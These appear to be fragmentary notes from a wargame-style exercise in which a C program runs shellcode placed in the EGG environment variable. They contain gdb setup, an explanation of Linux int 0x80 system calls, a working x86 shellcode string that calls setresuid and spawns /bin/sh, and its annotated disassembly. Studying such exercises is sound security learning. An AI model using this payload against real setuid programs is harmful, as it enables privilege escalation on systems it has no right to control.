# Overview
We get the following C code:
```
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
   */
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

break *main+75
set disassembly-flavor intel
tui new-layout foobar {-horizontal asm 2 regs 1} 2 status 0 cmd 1
layout foobar


With the Linux kernel, interrupt 0x80 is used to tell
the kernel to make a system call. When the int 0x80 instruction is executed, the
kernel will make a system call based on the first four registers. The EAX register
is used to specify which system call to make, while the EBX, ECX, and EDX
registers are used to hold the first, second, and third arguments to the system
call. All of these registers can be set using the mov instruction.

export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80')")


xor    eax,eax    ; set $eax to 0
xor    ebx,ebx    ; set $ebx to 0
xor    ecx,ecx    ; set $ecx to 0
cdq               ; effectively set $edx to 0
mov    al,0xa4    ; set $al to syscall setresuid
int    0x80       ; do the syscall
push   0xb        ; the next two instructions set $eax to 0xb (syscall execve)
pop    eax        ; maybe it's not possible to just use mov al,0xb due to byte restrictions
push   ecx        ; 
push   0x68732f2f ;
push   0x6e69622f
mov    ebx,esp
push   ecx
mov    edx,esp
push   ebx
mov    ecx,esp
int    0x80


less /usr/include/asm/unistd_32.h

less /usr/include/asm-generic/unistd.h setrlimit


setreuid(geteuid(),geteuid()
execve

int setresuid(uid_t ruid, uid_t euid, uid_t suid);


       An  unprivileged  process  may change its real UID, effective UID, and saved set-user-ID, each to one of: the current real UID, the current effective UID, or the current saved
       set-user-ID.
       
https://defuse.ca/online-x86-assembler.htm
       
       
